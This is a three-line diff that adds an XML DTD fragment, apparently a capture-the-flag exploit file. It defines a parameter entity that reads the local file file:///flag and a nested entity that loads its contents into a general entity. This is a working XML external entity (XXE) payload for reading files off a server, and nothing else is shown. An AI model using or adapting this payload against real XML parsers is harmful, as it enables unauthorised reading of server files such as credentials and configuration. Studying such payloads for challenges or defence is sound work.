@@ -1,0 +1,3 @@
+<!ENTITY % f SYSTEM "file:///flag">
+<!ENTITY % p "<!ENTITY res '%f;'>">
+%p;
